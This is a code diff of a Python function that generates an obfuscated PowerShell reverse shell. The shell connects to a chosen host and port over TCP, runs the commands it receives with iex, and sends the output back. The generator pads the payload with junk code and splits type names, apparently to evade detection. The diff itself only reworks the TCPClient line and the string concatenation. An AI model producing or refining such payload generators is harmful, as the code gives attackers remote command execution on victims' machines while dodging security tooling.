@@ -41,19 +41,20 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     # Fully explicit core shell: EVERY variable comes from var
     core_shell = (
         junk_code() +
-        f"${var['tcpclient']} = New-Object ([type]({split_string('System.Net.Sockets.TCPClient')})) -ArgumentList '{host}',{port}\n"
-        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
-        f"${var['bytes']} = 0..65535|%{{0}}\n"
-        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
-        f"    ${{var['data']}} = (New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
-        f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
-        f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n"
-        f"    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
-        f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n"
-        f"    ${{{var['stream']}}}.Flush()\n"
+        f"${var['tcpclient']} = New-Object -TypeName {split_string('System.Net.Sockets.TCPClient')} -ArgumentList '{host}',{port}\n"
+        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n" +
+        f"${var['bytes']} = 0..65535|%{{0}}\n" +
+        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n" +
+        f"    ${{var['data']}} = (New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n" +
+        f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n" +
+        f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n" +
+        f"    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n" +
+        f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n" +
+        f"    ${{{var['stream']}}}.Flush()\n" +
         "}\n" +
         junk_code()
     )
+
 
 
     # Loader: base64 always, never obfuscate the loader variable!
